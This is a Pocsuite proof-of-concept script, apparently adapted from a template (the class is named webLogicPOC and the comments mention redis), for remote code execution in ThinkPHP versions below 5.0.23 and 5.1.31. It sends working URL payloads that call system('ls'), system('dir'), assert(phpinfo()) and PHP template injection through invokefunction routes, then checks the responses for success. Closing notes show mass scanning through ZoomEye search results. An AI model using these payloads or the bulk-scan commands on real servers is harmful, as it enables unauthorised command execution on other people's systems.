#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
# 命令行
from pocsuite import pocsuite_cli
# 验证模块
from pocsuite import pocsuite_verify
# 攻击模块
from pocsuite import pocsuite_attack
# 控制台模式
from pocsuite import pocsuite_console
# requests
from pocsuite.api.request import req
import urllib
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip
import re
 
 

# 基础基类
class webLogicPOC(POCBase):
    vulID = '55'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-12-11'  # 漏洞公开的时间,不知道就写今天
    author = 'fanyingjie'  # PoC作者的大名
    createDate = '2018-12-11'  # 编写 PoC 的日期
    updateDate = '2018-12-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'thinkphp getshell'  # PoC 名称
    appPowerLink = ['']  # 漏洞厂商主页地址
    appName = 'thinkphp getshell'  # 漏洞应用名称
    appVersion = 'v5.0.23及v5.1.31以下版本'  # 漏洞影响版本
    vulType = 'thinkphp getshell'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        thinkphp getshell
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重"  # 严重,高危,中危,低危


    # 指纹方法
    def _fingerprint(self):
        pass

    # 验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        # 调用指纹方法
        result={}

        #如果设置端口则取端口,没有设置则为默认端口
        import re
        import socket
        import time
        vul_url = "%s"%self.url
        # from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = int(url2ip(vul_url)[1])
        else :
            _host = url2ip(vul_url)
            _port = 80
        

        #判断端口是否开放   
        import socket
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            sk.connect((_host,_port))
            #print 'Server port is OK!'
        except Exception:
           return self.save_output(result)
        sk.close()
        
        vul_ip = "http://%s:%s/" % (_host, _port)
        payloads=["index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=ads3234asdg34ggasda222",
                  "index.php?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=ads3234asdg34ggasda222",
                  "index.php?s=index/\\think\Request/input&filter=printf&data=ads3234asdg34ggasda222",
                  "index.php?s=index/\\think\\view\driver\Php/display&content=<?php printf 'ads3234asdg34ggasda222';?>",
                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=ads3234asdg34ggasda222"]
        
        payloads2=["index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls",
                  "index.php?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
                  "index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir",
                  "index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>",
                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls",
                  "index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir"]
        
        for p in payloads2:
            url=vul_ip+p
            try:
                text = req.get(url,timeout=4).text
                if ("index.php" in text and "robots.txt" in text) or ("Configuration File" in text):
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_ip
                    result['VerifyInfo']['Payload'] = p
                    return self.save_output(result)
            except Exception as e:
                print e
                pass
                
        return self.save_output(result)
            

    # 攻击模块
    def _attack(self):
        return self._verify()
        #pass

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册类
register(webLogicPOC)

"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md

钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
"""


